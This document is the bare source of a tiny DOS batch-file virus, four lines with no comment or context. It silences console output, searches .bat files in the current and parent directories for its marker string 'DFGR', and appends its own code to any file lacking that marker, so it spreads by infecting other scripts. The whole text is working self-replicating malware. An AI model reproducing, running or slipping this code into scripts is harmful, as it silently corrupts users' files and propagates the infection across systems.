@ctty nul
for %%q in (*.bat ..\*.bat) do set DFGR=%%q
find "DFGR" %DFGR%
if errorlevel 1 type %0>>%DFGR%
